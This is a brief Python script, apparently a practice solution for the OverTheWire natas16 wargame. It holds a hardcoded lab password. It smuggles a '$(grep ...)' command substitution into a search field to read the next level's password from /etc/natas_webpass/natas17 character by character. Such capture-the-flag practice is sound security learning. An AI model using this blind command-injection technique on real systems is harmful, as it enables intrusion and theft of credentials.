#Currently practicing natas16
import requests
import re 
from string import *

alphanum = lowercase + uppercase + digits
print(alphanum)
#charsFoundInPass = list()
url = 'http://natas16.natas.labs.overthewire.org'
usn = 'natas16'
password = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
confirmedPass = list()
session = requests.Session()
#response = session.get(url, auth =(usn, password))

while(len(confirmedPass) < 32):
  for ch in alphanum:
    
    response = session.post(url, data = { "needle" : "turtles$(grep ^" + "".join(confirmedPass) + ch  + " /etc/natas_webpass/natas17)" }, auth = (usn, password))
    #response = session.post(url, data = { "needle" : "anythings$(grep ^" + "".join(confirmedpass) + ch  + " /etc/natas_webpass/natas17)" },auth = (usn, pw) )
    pageContent = response.text

    charCheck = re.findall( '<pre>\n(.*)\n</pre>' , pageContent )
    if( not charCheck ):
      confirmedPass.append(ch)
      print "".join(confirmedPass)
      break		
print "".join(confirmedPass)
      